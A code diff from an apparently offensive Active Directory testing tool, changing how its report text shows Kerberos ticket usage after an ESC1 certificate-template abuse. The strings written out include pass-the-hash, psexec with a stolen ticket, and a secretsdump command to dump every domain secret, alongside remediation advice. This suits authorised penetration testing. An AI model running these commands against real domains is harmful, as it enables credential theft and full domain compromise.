@@ -1739,7 +1739,16 @@ class CardADParserMixin:
                 print(f"[HAWK] certipy auth cred push failed: {e}")
 
             tgt_line = f"TGT      : {ccache}\n" if ccache else ""
-            krbcc = ccache or "<user>.ccache"
+            if ccache:
+                tgt_usage = (f"  Or the TGT directly: export "
+                             f"KRB5CCNAME={ccache}; klist; "
+                             f"impacket-psexec -k -no-pass -dc-ip <DC-IP> "
+                             f"'<DOMAIN>/{uname}@<DC-FQDN>'\n")
+            else:
+                tgt_usage = ("  (HAWK runs certipy auth with -no-save to "
+                             "stay non-interactive, so no .ccache is "
+                             "written; re-run without -no-save if you want "
+                             "the TGT for pass-the-ticket.)\n")
             _title = (f"CERTIPY AUTH — {uname} NT hash via ESC1 on "
                       f"{target}")
             _desc = (
@@ -1754,9 +1763,7 @@ class CardADParserMixin:
                 f"  Pass-the-hash: nxc smb <DC-IP> -u '{uname}' -H {nt}\n"
                 f"  DCSync every secret: impacket-secretsdump -hashes "
                 f":{nt} '<DOMAIN>/{uname}@<DC-IP>'\n"
-                f"  Or the TGT directly: export KRB5CCNAME={krbcc}; "
-                f"klist; impacket-psexec -k -no-pass -dc-ip <DC-IP> "
-                f"'<DOMAIN>/{uname}@<DC-FQDN>'\n\n"
+                f"{tgt_usage}\n"
                 f"Remediation:\n"
                 f"  Fix the ESC1 template (remove ENROLLEE_SUPPLIES_"
                 f"SUBJECT or require manager approval), enable strong "
